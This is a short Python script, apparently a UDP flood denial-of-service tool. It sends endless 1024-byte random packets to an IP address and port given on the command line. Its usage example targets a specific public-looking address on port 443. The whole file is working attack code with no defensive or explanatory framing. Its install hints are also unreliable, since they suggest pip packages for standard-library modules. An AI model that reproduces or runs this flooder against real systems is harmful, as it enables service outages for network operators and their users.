#!/usr/bin/env python3
import sys
try:
    import socket
except:
    sys.exit("Install missing library: pip install sockets")
try:
    import random
except:
    sys.exit("Install missing library: pip3 install random2")

if len(sys.argv) !=3:
    print("follow the examples: ")
    print("")
    print("%s ip(xxx.xxx.xxx.xxx) port"%(sys.argv[0]))
    print("%s 52.250.42.157 443"%(sys.argv[0]))
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(1024)

try:
    while True:
        att = sock.sendto(packet, (str(ip), int(port)))
        print("send packet: ", att)
except KeyboardInterrupt:
    sys.exit()
except Exception as error:
    print(error)

